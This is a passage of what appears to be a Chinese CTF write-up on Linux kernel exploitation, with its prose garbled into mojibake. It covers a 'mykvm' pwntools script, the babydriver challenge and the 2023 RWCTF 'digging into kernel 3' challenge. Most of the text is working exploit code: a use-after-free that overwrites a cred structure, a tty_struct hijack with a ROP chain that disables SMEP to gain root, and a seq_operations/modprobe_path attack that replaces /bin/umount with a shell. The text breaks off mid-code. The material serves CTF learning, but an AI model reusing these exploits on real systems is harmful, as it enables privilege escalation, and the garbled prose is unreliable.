from hashlib import sha256

p = remote("127.0.0.1","8000") #typ="udp"
# p = process("./pwn")
elf = ELF("./mykvm")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------


with open("./exp.bin", "rb") as f:
    shellcode = f.read()

# pause()
sla("your code size: ",len(shellcode))
sa("your code:",shellcode)
sla("guest name:",'aaaa')
sla("guest passwd:",'bbbb')
sla("host name: ",'cccc')


ia()
```


### babydriver

ä¸€é“å†…æ ¸çš„å…¥é—¨é¢˜ç›®ï¼Œé¦–å…ˆæ£€æŸ¥ä¿¡æ¯
```shell
qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1'  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -enable-kvm
```

å¼€å¯äº†smepï¼Œæ²¡æœ‰å¼€å¯kaslr

æå–æ–‡ä»¶ç³»ç³»ç»Ÿï¼Œå…³æ³¨å…¶å¯åŠ¨æ–‡ä»¶ init

```shell
excpio rootfs.cpio
```

```shell
âœ  rootfs cat init
#!/bin/sh

mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs devtmpfs /dev
chown root:root flag
chmod 400 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /lib/modules/4.4.72/babydriver.ko
chmod 777 /dev/babydev
echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
setsid cttyhack setuidgid 1000 sh

umount /proc
umount /sys
poweroff -d 0  -f
```

åŠ è½½äº†ä¸€ä¸ªå†…æ ¸æ¨¡å—babydriver.ko(å…³äºå†…æ ¸æ¨¡å—çš„ç¼–å†™è¿™é‡Œå¯ä»¥ä¸“é—¨å­¦ä¹ ä¸€ä¸‹)ï¼Œå†…æ ¸ç‰ˆæœ¬4.4.72

ä¹Ÿå¯ä»¥å¯åŠ¨ä»¥åå†æŸ¥çœ‹ï¼ŒåŒæ—¶ç”±äºæ²¡æœ‰å¼€å¯kalsrï¼Œæˆ‘ä»¬æå–ä¸€ä¸‹å‡½æ•°ç¬¦å·è¡¨

```
/ $ lsmod
babydriver 16384 0 - Live 0xffffffffc0000000 (OE)

cat /proc/kallsyms > /tmp/kallsyms.txt
cat /tmp/kallsyms.txt | grep "prepare_kernel_cred"
cat /tmp/kallsyms.txt | grep "commit_creds"

ffffffff810a1810 T prepare_kernel_cred
ffffffff81d91890 R __ksymtab_prepare_kernel_cred
ffffffff81dac968 r __kcrctab_prepare_kernel_cred
ffffffff81db9450 r __kstrtab_prepare_kernel_cred

ffffffff810a1420 T commit_creds
ffffffff81d88f60 R __ksymtab_commit_creds
ffffffff81da84d0 r __kcrctab_commit_creds
ffffffff81db948c r __kstrtab_commit_creds
```

ç„¶åå°±æ˜¯åˆ†æbabydriver.koè¿™ä¸ªæ¨¡å—äº†

```c
int __cdecl babydriver_init()
{
  int v0; // edx
  int v1; // ebx
  class *v2; // rax
  __int64 v3; // rax

  if ( alloc_chrdev_region(&babydev_no, 0LL, 1LL, "babydev") >= 0 )//ä¸ºè®¾å¤‡åˆ†é…ä¸€ä¸ªä¸»è®¾å¤‡å·å’Œä¸€ä¸ªæ¬¡è®¾å¤‡å·,babydev_no å°†å­˜å‚¨åˆ†é…çš„è®¾å¤‡å·
  {
    cdev_init(&cdev_0, &fops);//åˆå§‹åŒ–å­—ç¬¦è®¾å¤‡å¹¶å°†å…¶ä¸æ–‡ä»¶æ“ä½œç»“æ„ä½“ fops å…³è”
    cdev_0.owner = &_this_module;
    v1 = cdev_add(&cdev_0, babydev_no, 1LL);//å°†è®¾å¤‡åŠ å…¥ç³»ç»Ÿ
    if ( v1 >= 0 )
    {
      v2 = _class_create(&_this_module, "babydev", &babydev_no);//åˆ›å»ºä¸€ä¸ªæ–°çš„è®¾å¤‡ç±»ï¼Œè¿™ä¸ªç±»åœ¨ /sys/class ä¸‹å¯¹åº”ä¸€ä¸ªç›®å½•ï¼Œ/sys/class/babydev
      babydev_class = v2;
      if ( v2 )
      {
        v3 = device_create(v2, 0LL, babydev_no, 0LL, "babydev");//ï¼ï¼ï¼åˆ›å»ºäº†ä¸€ä¸ªè®¾å¤‡èŠ‚ç‚¹ï¼Œé€šå¸¸åœ¨ /dev ç›®å½•ä¸‹ã€‚è¿™ä½¿å¾—ç”¨æˆ·ç©ºé—´çš„ç¨‹åºå¯ä»¥é€šè¿‡è®¾å¤‡æ–‡ä»¶ä¸é©±åŠ¨ç¨‹åºè¿›è¡Œäº¤äº’ã€‚
        v0 = 0;
        if ( v3 )
          return v0;
        printk(&unk_351);
        class_destroy(babydev_class);
      }
      else
      {
        printk(&unk_33B);
      }
      cdev_del(&cdev_0);
    }
    else
    {
      printk(&unk_327);
    }
    unregister_chrdev_region(babydev_no, 1LL);
    return v1;
  }
  printk(&unk_309);
  return 1;
}
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240102110359.png)

è¿™é‡Œè°ˆä¸€ä¸‹file_operationsï¼Œè¿™ä¸ªç»“æ„ä½“ä¼šæŠŠæ˜¯ä¸ªå‡½æ•°åŠŸèƒ½æŒ‡é’ˆä¼šæŠŠå¸¸è§çš„å‡½æ•°å’Œæ¨¡å—çš„å‡½æ•°åšä¸€ä¸ªå¯¹åº”
```c
00000000 file_operations struc ; (sizeof=0xD8, align=0x8, copyof_137)
00000000                                         ; XREF: .data:fops/r
00000000 owner dq ?                              ; offset
00000008 llseek dq ?                             ; offset
00000010 read dq ?                               ; offset
00000018 write dq ?                              ; offset
00000020 read_iter dq ?                          ; offset
00000028 write_iter dq ?                         ; offset
00000030 iterate dq ?                            ; offset
00000038 poll dq ?                               ; offset
00000040 unlocked_ioctl dq ?                     ; offset
00000048 compat_ioctl dq ?                       ; offset
00000050 mmap dq ?                               ; offset
00000058 open dq ?                               ; offset
00000060 flush dq ?                              ; offset
00000068 release dq ?                            ; offset
00000070 fsync dq ?                              ; offset
00000078 aio_fsync dq ?                          ; offset
00000080 fasync dq ?                             ; offset
00000088 lock dq ?                               ; offset
00000090 sendpage dq ?                           ; offset
00000098 get_unmapped_area dq ?                  ; offset
000000A0 check_flags dq ?                        ; offset
000000A8 flock dq ?                              ; offset
000000B0 splice_write dq ?                       ; offset
000000B8 splice_read dq ?                        ; offset
000000C0 setlease dq ?                           ; offset
000000C8 fallocate dq ?                          ; offset
000000D0 show_fdinfo dq ?                        ; offset
000000D8 file_operations ends
```

äº‹å®ä¸Šreleaseå‡½æ•°æ˜¯å½“ç”¨æˆ·ç©ºé—´ç¨‹åºæ‰§è¡Œ close() ç³»ç»Ÿè°ƒç”¨æ—¶è°ƒç”¨çš„å‡½æ•°

é€šè¿‡/dev/babydevå°±èƒ½ç”¨é€šç”¨å‡½æ•°å’Œæ¨¡å—å‡½æ•°è¿›è¡Œäº¤äº’äº†ï¼Œç»“åˆfopsä¸»è¦å®šä¹‰äº†å‡ ä¸ªå‡½æ•°åŠŸèƒ½

```c
int __fastcall babyrelease(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  kfree(babydev_struct.device_buf);// UAF
  printk("device release\n");
  return 0;
}

int __fastcall babyopen(inode *inode, file *filp)
{
  _fentry__(inode, filp);
  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[6], 0x24000C0LL, 0x40LL);//åœ¨å†…æ ¸å†…å­˜ä¸­åˆ†é…å†…å­˜ç»™å…¨å±€å˜é‡babydev_struct.device_bufï¼Œ(ç±»å‹ï¼Œæ ‡å¿—ï¼Œå¤§å°)ï¼Œkmalloc_caches[6]ç‰¹å®šå¤§å°çš„ kmem_cache
  babydev_struct.device_buf_len = 64LL;
  printk("device open\n");
  return 0;
}

__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
{
  size_t v3; // rdx
  size_t v4; // rbx

  _fentry__(filp, command);
  v4 = v3;
  if ( command == 0x10001 )
  {
    kfree(babydev_struct.device_buf);
    babydev_struct.device_buf = _kmalloc(v4, 0x24000C0LL);//é‡æ–°åˆ†é…ä¸€ä¸ªæŒ‡å®šå¤§å°çš„å †å—
    babydev_struct.device_buf_len = v4;
    printk("alloc done\n");
    return 0LL;
  }
  else
  {
    printk(&unk_2EB);
    return -22LL;
  }
}


ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_from_user();//å°†ç”¨æˆ·æ€çš„æ•°æ®(ä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„)æ‹·è´ç»™babydev_struct.device_buf
    return v6;
  }
  return result;
}

ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
{
  size_t v4; // rdx
  ssize_t result; // rax
  ssize_t v6; // rbx

  _fentry__(filp, buffer);
  if ( !babydev_struct.device_buf )
    return -1LL;
  result = -2LL;
  if ( babydev_struct.device_buf_len > v4 )
  {
    v6 = v4;
    copy_to_user(buffer);//babydev_struct.device_bufæŒ‡å‘çš„å†…å®¹æ‹·è´åˆ°ç”¨æˆ·æ€
    return v6;
  }
  return result;
}

```

babyopenä¸­å­˜åœ¨æ¼æ´ï¼Œç®€å•æ¥è¯´è¿™ä¸ªåŠŸèƒ½æ˜¯ç”¨äºåˆ†é…å †å—çš„ï¼Œè¿™é‡ŒæŠŠåˆ†é…çš„æŒ‡é’ˆæ”¾åˆ°äº†å†…æ ¸æ¨¡å—çš„bssæ®µä¸Šï¼Œå°±å¯¼è‡´äº†æ¯ä¸ªæ–°opençš„è¯¥è®¾å¤‡çš„fdæ‰€å¼€è¾Ÿçš„å †å—ï¼Œè¢«æ‰€æœ‰ä½¿ç”¨è¯¥è®¾å¤‡çš„fdå…±ç”¨ã€‚è¿™æ˜¯ä¸€ä¸ªé€»è¾‘é—®é¢˜ï¼Œåœ¨babyioctlåŒæ ·å­˜åœ¨

babyreleaseçš„UAFæ¼æ´

æ‰€ä»¥ç¬¬ä¸€ç§æ€è·¯å°±æ˜¯UAF
forkå­è¿›ç¨‹æ—¶ï¼Œä¼šåˆ†é…0xa8å¤§å°(size)çš„å†…æ ¸å †ï¼Œä¸»è¦ç”¨äºå­˜å‚¨å½“å‰è¿›ç¨‹çš„ä¸€äº›ä¿¡æ¯ï¼ŒåŒ…æ‹¬æƒé™ç­‰ã€‚babyioctlå¯ä»¥åˆ†é…ä¸€ä¸ª0xa8å¤§å°çš„å †å—ç„¶åfreeæ‰ï¼Œå†æ‰§è¡Œforkï¼Œå†ç»“åˆbabyopençš„å¤šä¸ªfdæŒ‡é’ˆï¼Œå°±å¯ä¿®æ”¹forkè¿›ç¨‹ç»“æ„ä½“é‡Œçš„å†…å®¹
å¯¹äºæ”¹å­è¿›ç¨‹credçš„æ–¹æ³•ä¹Ÿæœ‰2ç§æ€è·¯ï¼Œæ ¸å¿ƒæ˜¯å­è¿›ç¨‹è¦å…ˆäºçˆ¶è¿›ç¨‹æ‰§è¡Œsystem("/bin/sh")
+ å¯ä»¥åœ¨çˆ¶è¿›ç¨‹è®¾ç½®ä¸€ä¸ªwait(NULL)æ“ä½œéƒ½åœ¨å­è¿›ç¨‹ä¸­å®Œæˆ
+ å¯ä»¥åœ¨å­è¿›ç¨‹è®¾ç½®ä¸€ä¸ªsleepï¼Œä¸”åªæ‰§è¡Œsystem("/bin/sh")ï¼Œçˆ¶è¿›ç¨‹å®Œæˆæ‰€æœ‰æ“ä½œ

EXP

```c
#include<stdlib.h>

int main(){
	int fd1 = open("/dev/babydev",2);
	int fd2 = open("/dev/babydev",2);	

	ioctl(fd1,0x10001,0xa8);
	close(fd1);
	pid_t fpid; 
	fpid=fork();
	if (fpid < 0) 
	{
		printf("error in fork!\n"); 
		exit(0);
	}
	else if (fpid == 0) 
	{
		printf("child pid is : %d\n",getpid());
		char zeros[30] = {0};
		write(fd2,zeros,28);
		system("/bin/sh");
		exit(0);
	}
	// {
	// 	printf("child pid is : %d\n",getpid());
	// 	sleep(3)
	// 	system("/bin/sh");
	// 	exit(0);
	// }
	else 
	{
		wait(NULL);
		printf("parent pid is: %d\n",getpid());
	}
	// {
	// 	char zeros[30] = {0};
	// 	write(fd2,zeros,28);
	// 	wait(NULL);
	// 	printf("parent pid is: %d\n",getpid());
	// }
	printf("%d: going to close fd2\n",getpid());
	close(fd2);
	return 0;
}
```


è¿˜æœ‰ä¸€ç§å¯ä»¥åˆ©ç”¨çš„å°±æ˜¯tty_structç»“æ„ä½“
è¿™ä¸ªç»“æ„ä½“æ˜¯åœ¨å¼€å¯/dev/ptmxè®¾å¤‡èŠ‚ç‚¹æ—¶ï¼Œä¼šè¢«åˆ†é…åˆ°ä¸€ä¸ª0x2e0ï¼ˆä¸åŒå†…æ ¸ç‰ˆæœ¬æœ‰æ‰€åŒºåˆ«ï¼‰çš„ç»“æ„ä½“tty_struct
è¿™ä¸ªç»“æ„ä½“å¦‚ä¸‹
```c
struct tty_struct {
	int	magic; //4
	struct kref kref;//4
	struct device *dev;//8
	struct tty_driver *driver;//8
	const struct tty_operations *ops; 
  // Â·Â·Â·Â·Â·Â·
}
// https://elixir.bootlin.com/linux/v4.7.2/source/include/linux/tty.h#L272
```

```c
struct tty_operations {
	struct tty_struct * (*lookup)(struct tty_driver *driver,
			struct file *filp, int idx);
	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
	int  (*open)(struct tty_struct * tty, struct file * filp);
	void (*close)(struct tty_struct * tty, struct file * filp);
	void (*shutdown)(struct tty_struct *tty);
	void (*cleanup)(struct tty_struct *tty);
	int  (*write)(struct tty_struct * tty,
		      const unsigned char *buf, int count);
	int  (*put_char)(struct tty_struct *tty, unsigned char ch);
	void (*flush_chars)(struct tty_struct *tty);
	int  (*write_room)(struct tty_struct *tty);
	int  (*chars_in_buffer)(struct tty_struct *tty);
	int  (*ioctl)(struct tty_struct *tty,
		    unsigned int cmd, unsigned long arg);
  // ......
}
```

è¿™ä¸ªç»“æ„ä½“é‡Œå­˜æ”¾çš„æ˜¯å¯¹åº”ç»ˆç«¯çš„ä¸€äº›æ“ä½œå‡½æ•°,è¿™äº›å‡½æ•°åŒ…æ‹¬ä½†ä¸é™äºï¼š

openï¼šæ‰“å¼€ä¸€ä¸ª TTY è®¾å¤‡ã€‚
closeï¼šå…³é—­ä¸€ä¸ª TTY è®¾å¤‡ã€‚
writeï¼šå‘ TTY è®¾å¤‡å†™å…¥æ•°æ®ã€‚
readï¼šä» TTY è®¾å¤‡è¯»å–æ•°æ®ã€‚
ioctlï¼šæ‰§è¡Œæ§åˆ¶æ“ä½œï¼Œå¦‚æ”¹å˜ç»ˆç«¯è®¾ç½®ã€‚
set_termiosï¼šè®¾ç½®ç»ˆç«¯çš„å±æ€§ã€‚

å¯ä»¥å»åŠ«æŒè¿™ä¸ªç»“æ„ä½“é‡Œçš„å‡½æ•°æŒ‡é’ˆå®ç°åˆ©ç”¨

ç”±äºè¦åœ¨å†…æ ¸æ€æ‰§è¡ŒROPï¼Œæ‰€ä»¥éœ€è¦ä¿å­˜ç”¨æˆ·æ€ä¸Šä¸‹æ–‡å’Œè€ƒè™‘ç”¨æˆ·æ€ç€é™†ï¼Œè¿™éƒ¨åˆ†éƒ½æ˜¯æ¿å­å†…å®¹å°±ä¸å†èµ˜è¿°
è¿™é‡Œçš„æ€è·¯æ˜¯ï¼Œåˆ©ç”¨UAFæ¼æ´åŠ«æŒtty_structç»“æ„ä½“ï¼Œåˆ©ç”¨readå‡½æ•°å°†ç»“æ„ä½“çš„æ•°æ®æå–å‡ºæ¥ä¾¿äºä¼ªé€ ï¼Œä¿®æ”¹tty_operationsæŒ‡é’ˆä¸ºæˆ‘ä»¬åœ¨ç”¨æˆ·æ€è®¾ç½®çš„ä¼ªé€ tty_operationsçš„åœ°å€ï¼Œç„¶åä¼ªé€ tty_operationsï¼Œè¿™é‡Œä¸»è¦åŠ«æŒwriteå‡½æ•°ï¼Œé€šè¿‡è°ƒè¯•å¾—åˆ°åœ¨æ‰§è¡Œè¯¥writeå‡½æ•°æ—¶ï¼Œraxä¸ºç”¨æˆ·æ€ä¼ªé€ tty_operationsçš„åœ°å€ï¼Œæ‰€ä»¥å°†æ•´ä¸ªtty_operationsç»“æ„ä½“è¦†ç›–ä¸ºmov rsp raxï¼Œè¿™æ ·å°±èƒ½æ§åˆ¶æ‰§è¡Œæµåˆ°tty_operationsç»“æ„ä½“å¼€å§‹çš„ä½ç½®ï¼Œç„¶ååœ¨tty_operationsç»“æ„ä½“çš„å‰è¾¹æ”¾ç½®å¥½æ ˆè¿ç§»æŒ‡ä»¤ï¼Œè¿ç§»åˆ°ç”¨æˆ·æ€ä¸Šæ„é€ çš„ROPé“¾ï¼Œå°±å®Œæˆäº†åˆ©ç”¨ã€‚
è¿™é‡Œå¼€å¯äº†smepï¼Œè¦åœ¨ROPçš„æ—¶å€™ä¿®æ”¹cr4å¯„å­˜å™¨æ¥å…³é—­smepï¼Œå¸¸å°†cr4çš„å€¼è®¾ç½®ä¸º0x6f0

EXP
å°†-enable-kvmå‚æ•°åˆ é™¤
```c
//gcc -Wall -static -o exp exp2.c
#include<unistd.h>
#include<stdio.h>
#include<stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

size_t pkc_addr = 0xffffffff810a1810;
size_t cc_addr = 0xffffffff810a1420;
void get_root(){
    char* (*pkc)(int) = pkc_addr;
    void (*cc)(char*) = cc_addr;
    (*cc)((*pkc)(0));
}

void get_shell(){
    system("/bin/sh");
}

size_t user_cs, user_rflags, user_sp, user_ss;
void save_status()
{
    __asm__("mov %cs, user_cs;"
            "mov %ss, user_ss;"
            "mov %rsp, user_sp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[*]status has been saved.");
}

int main(){
    save_status();

    size_t mov_rsp_rax = 0xffffffff8181bfc5;    // mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e
    size_t pop_rax = 0xffffffff8100ce6e;        // pop rax; ret; 
    size_t rop_chain[30] = {0};
    int index = 0;
    rop_chain[index++] = 0xffffffff810d238d;        // pop rdi; ret;
    rop_chain[index++] = 0x6f0;
    rop_chain[index++] = 0xffffffff81004d80;        // mov cr4, rdi; pop rbp; ret; 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = (size_t)get_root;
    rop_chain[index++] = 0xffffffff81063694;        // swapgs; pop rbp; ret; 
    rop_chain[index++] = 0x0;
    rop_chain[index++] = 0xffffffff814e35ef;        // iretq; ret;
    rop_chain[index++] = (size_t)get_shell;
    rop_chain[index++] = user_cs;
    rop_chain[index++] = user_rflags;
    rop_chain[index++] = user_sp;
    rop_chain[index++] = user_ss;

    size_t tty_operations_fake[30];
    for(int j=0;j<30;j++){
        tty_operations_fake[j]=mov_rsp_rax;   
    }

    int fd1 = open("/dev/babydev",2);
    int fd2 = open("/dev/babydev",2);

    ioctl(fd1,0x10001,0x2e0);
    close(fd1);

    int fd_tty = open("dev/ptmx",2);

    size_t tty_struct_leak[4];
    read(fd2,tty_struct_leak,32);
    
    tty_operations_fake[0] = pop_rax;
    tty_operations_fake[1] = (size_t)rop_chain;
    tty_operations_fake[2] = mov_rsp_rax;

    tty_struct_leak[3] = (size_t)tty_operations_fake;
    write(fd2,tty_struct_leak,32);

    size_t a[4] = {0,0,0,0};
    write(fd_tty,a,32);
    // ioctl(fd_tty,0x100,32);

    close(fd2);
	return 0;
}
```



### 2023RWCTF digging into kernel 3

å…ˆæ£€æŸ¥ä¿¡æ¯
```shell
#!/bin/sh
qemu-system-x86_64 \
        -m 128M \
        -nographic \
        -kernel ./bzImage \
        -initrd ./rootfs.img \
        -enable-kvm \
        -cpu kvm64,+smap,+smep \
        -monitor /dev/null \
        -append 'console=ttyS0 kpti=1 quiet kaslr oops=panic panic=1 init=/init' \
        -no-reboot \
        -snapshot 
```

é¢˜ç›®å¼€äº†kaslr,smepï¼ˆè¦ç”¨ptregsï¼‰ï¼Œå†çœ‹ä¸‹init

```shell
#!/bin/sh

mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t tmpfs none /tmp

exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /rwctf.ko
chmod 666 /dev/rwctf
chmod 700 /flag
chmod 400 /proc/kallsyms

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

# poweroff -d 120 -f &

echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
setsid /bin/cttyhack setuidgid 0 /bin/sh

umount /proc
umount /sys
umount /tmp

poweroff -d 0 -f
```

æŠŠè¶…æ—¶æŒ‚èµ·å’Œæƒé™æ”¹äº†ï¼ŒæŠŠrun.shé‡Œçš„kaslræ”¹ä¸ºnokaslrï¼Œæ–¹ä¾¿è°ƒè¯•

ç”±äºé™åˆ¶äº†/proc/kallsymsçš„æƒé™ï¼Œæˆ‘ä»¬æ˜¯çœ‹ä¸äº†å‡½æ•°è¡¨çš„/proc/kallsymsï¼Œè¿™é‡Œç€é‡åˆ†ærwctf.ko
åŸºæœ¬ä¸Šåªæœ‰ä¸€ä¸ªåŠŸèƒ½rwmod_ioctl
```c
__int64 __fastcall rwmod_ioctl(__int64 a1, int a2, __int64 a3)
{
  __int64 v3; // r12
  __int64 v5; // rbx
  __int64 v6; // rdi
  unsigned int idx; // [rsp+0h] [rbp-30h] BYREF
  unsigned int size; // [rsp+4h] [rbp-2Ch]
  __int64 con; // [rsp+8h] [rbp-28h]
  unsigned __int64 v10; // [rsp+18h] [rbp-18h]

  v10 = __readgsqword(0x28u);
  if ( !a3 )
    return -1LL;
  if ( a2 == 0xC0DECAFE )
  {
    if ( !copy_from_user(&idx, a3, 0x10LL) && idx <= 1 )
      kfree(buf[idx]);
    return 0LL;
  }
  v3 = -1LL;
  if ( a2 == 0xDEADBEEF )
  {
    if ( copy_from_user(&idx, a3, 0x10LL) )
      return 0LL;
    v5 = idx;
    if ( idx > 1 )
      return 0LL;
    buf[v5] = _kmalloc(size, 0xDC0LL);
    v6 = buf[idx];
    if ( !v6 )
      return 0LL;
    if ( size > 0x7FFFFFFFuLL )
      BUG();
    if ( copy_from_user(v6, con, size) )
      return 0LL;
  }
  return v3;
}
```

æ ¹æ®a2ä¸åŒæ‰§è¡Œä¸åŒçš„åˆ†æ”¯
å…³äºcopy_from_user

```c
unsigned long copy_from_user(void *to, const void __user *from, unsigned long n);

ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯æŒ‡é’ˆï¼Œè¿”å›æœªæˆåŠŸå¤åˆ¶çš„å­—èŠ‚æ•°
```


å½“a2ä¸º0xC0DECAFEï¼ŒæŠŠa3é‡Œè¾¹çš„å€¼æ‹·è´åˆ°idxï¼Œidxåªèƒ½å–0å’Œ1ï¼Œç„¶åä¸€ä¸ªUAF
å½“a2ä¸º0xDEADBEEFï¼Œå°±æ˜¯å¼€ä¸€ä¸ªsizeçš„å †å—æ”¾åˆ°bufé‡Œï¼Œidxåªèƒ½å–0å’Œ1ï¼Œsizeä¸èƒ½è¿‡å¤§ï¼Œå†æŠŠå†…å®¹æ‹·è´è¿‡å»ï¼Œç»“åˆæ ˆç»“æ„ï¼Œå…ˆå…ˆå†™ä¸€ä¸ªç»“æ„ä½“
![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20240105172824.png)

```c
struct rwstruct{
	unsigned int idx;//4
	unsigned int size;//4
	char *con;//8
}
```

2ä¸ªåŠŸèƒ½èœå•

```c
int g_fd;

int rwctf_ioctl_kmalloc(int idx,int size, char* con){
	struct rwstruct rw_buf;
	rw_buf.idx = idx;
	rw_buf.size = size;
	rw_buf.con = con;
	ioctl(g_fd,0xDEADBEEF,&rw_buf);
}


int rwctf_ioctl_kfree(int idx){
	struct rwstruct rw_buf;
	rw_buf.idx = idx;
	rw_buf.size = 0;
	rw_buf.con = 0;
	ioctl(g_fd,0xC0DECAFE,&rw_buf);
}
```

æœ‰äº†ä»»æ„sizeåˆ›å»ºå’ŒUAFï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥å¼€å§‹åˆ©ç”¨äº†

#### æ–¹æ³•ä¸€
é¦–å…ˆè€ƒè™‘æ²¡æœ‰kalsrä¸‹å¦‚ä½•å®Œæˆåˆ©ç”¨
åç»­è‚¯å®šæ˜¯è¦ptregså®ç°ROPçš„ï¼Œæœ‰äº†ä»»æ„å †å¤§å°çš„UAFå¯ä»¥åŠ«æŒseq_operationsï¼Œç”¨seq_operations+pt_regs+modprobe_path

```c
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <err.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/timerfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <linux/keyctl.h>
#include <time.h>

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif

void hexdump(void *mem, unsigned int len) {
    putchar('\n');
    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {
        /* print offset */
        if(i % HEXDUMP_COLS == 0) {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if(i < len) {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        /* end of block, just aligning for ASCII dump */
        else {        
            printf("   ");
        }

        /* print ASCII dump */
        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {
            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {
                 /* end of block, not really printing */
                if(j >= len) {
                    putchar(' ');
                }
                /* printable char */
                else if(isprint(((char*)mem)[j])) {
                    putchar(0xFF & ((char*)mem)[j]);
                }
                 /* other char */
                else {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
    putchar('\n');
}

int g_fd;
int seq_fd;
int64_t seq_read_buf[4];

struct rwstruct{
    unsigned int idx;
    unsigned int size;
    char* con;
};


int rwctf_ioctl_kmalloc(int idx, int size, char* con){
    struct rwstruct rw_buf;
    rw_buf.idx = idx;
    rw_buf.size = size;
    rw_buf.con = con;
    ioctl(g_fd,0xDEADBEEF,&rw_buf);
}

int rwctf_ioctl_kfree(int idx){
    struct rwstruct rw_buf;
    rw_buf.idx = idx;
    rw_buf.size = 0;
    rw_buf.con = 0;
    ioctl(g_fd,0xC0DECAFE,&rw_buf);
}


int prepare(){
    system("echo '#!/bin/sh\nrm /bin/umount\necho -e \"#!/bin/sh\\n/bin/sh\" > /bin/umount\nchmod 777 /bin/umount' > /tmp/x");
    system("chmod +x /tmp/x");//0x782f706d742f
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");
    if(fork()) {
        sleep(3);
        system("/tmp/dummy 2>/dev/null");
        system("ls -l /flag");
        system("cat /flag");
        exit(1);
    }
}

int64_t add_rsp_170_ret = 0xffffffff819d9f4c;
int64_t pop_rax_ret = 0xffffffff81000ddb;
int64_t pop_rdi_ret = 0xffffffff8106ab4d;
int64_t mov_ptr_rdi_rax_ret = 0xffffffff81074e3c; //: mov qword ptr [rdi], rax ; xor eax, eax ; jmp 0xffffffff82003240;
int64_t modprobe_path_addr = 0xFFFFFFFF828510A0;
int64_t do_task_dead_func = 0xFFFFFFFF810A3190;
int64_t pop_rbp_ret = 0xffffffff810679ef;

int hijack(){



    int OBJ_SIZE = 0x20;
    char * tmp_buf = malloc(OBJ_SIZE);
    memset(tmp_buf,'a',OBJ_SIZE);
    rwctf_ioctl_kmalloc(0,OBJ_SIZE,tmp_buf);
    rwctf_ioctl_kfree(0);

    seq_fd = open("/proc/self/stat",0);
    rwctf_ioctl_kfree(0);
    char fake_seq_operations[OBJ_SIZE];
    memset(fake_seq_operations,'0',OBJ_SIZE);
    *(unsigned long long *)&fake_seq_operations[0x0] = add_rsp_170_ret;
    *(unsigned long long *)&fake_seq_operations[0x8] = 0x0;
    *(unsigned long long *)&fake_seq_operations[0x10] = 0x0;
    *(unsigned long long *)&fake_seq_operations[0x18] = 0x0;

    rwctf_ioctl_kmalloc(0,OBJ_SIZE,fake_seq_operations);
    //int64_t seq_read_buf[4];
    __asm__(
